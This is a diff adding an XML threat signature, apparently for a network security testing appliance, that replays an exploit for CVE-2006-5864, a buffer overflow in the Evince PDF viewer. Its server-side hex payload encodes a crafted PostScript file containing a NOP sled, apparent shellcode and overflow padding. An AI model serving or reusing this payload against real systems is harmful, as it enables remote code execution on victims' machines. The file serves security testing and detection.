@@ -1,0 +1,90 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Evince Buffer Overflow"/>
+    <EngDesc display="true" value="This threat causes a buffer overflow in the PDF view evince, which is used with most modern linux distributions.  This can lead to running code remotely from a PDF document.  This type of threat could typically come from a webserver listening on port 80."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Buffer_Overflow"/>
+      <item value="Corruption"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Evince"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Evince_Evince"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Evince_Evince_0.4.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://milw0rm.com/exploits/2858"/>
+    <CVEID display="true" value="CVE-2006-5864"/>
+    <bugtraqID display="true" value="20978"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="b41581c007c3de7fceab95440585adb5"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="local"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633005775207500000"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1165010740" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="F">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="G"/>
+  </Loops>
+  <PostScript/>
+  <Output index="F" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F20485454502F312E300D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="G" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A204672692C2030312044656320323030362032313A32323A333620474D540D0A5365727665723A204170616368652F322E302E353420284665646F7261290D0A4C6173742D4D6F6469666965643A204672692C2030312044656320323030362032313A32323A313820474D540D0A455461673A20223164663036372D3232362D3938333964363830220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203535300D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D547970653A206170706C69636174696F6E2F706F73747363726970740D0A0D0A252150532D41646F62652D332E300A25255469746C653A2068656C6C6F2E70730A2525466F723A204B2D7350656369616C2028787A7A69726F7A2E6E657429206F66202E6177617265202861776172656E6574776F726B2E6F7267290A2525426F756E64696E67426F783A20323420323420353838203736380A2525446F63756D656E744D656469613A209090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909029C983E9EED9EED97424F45B817313C5BCB87783EBFCE2F4F467EB3496D6BA1DA3E43196083C2B2E758375F78CC5412C9FD4C777C5BDDE1FD55DFB11963559C7A3ECE9244C5DFBBA45EED058EACFD01FEADED1194C5FEA244C5D087C083CB877414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414177E7FFFFE902FFFFFF0A2525446F63756D656E74446174613A20436C65616E374269740A25254F7269656E746174696F6E3A204C616E6473636170650A252550616765733A20310A2525506167654F726465723A20417363656E640A25252B20656E636F64696E672049534F2D383835392D31456E636F64696E670A2525456E64436F6D6D656E74730A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
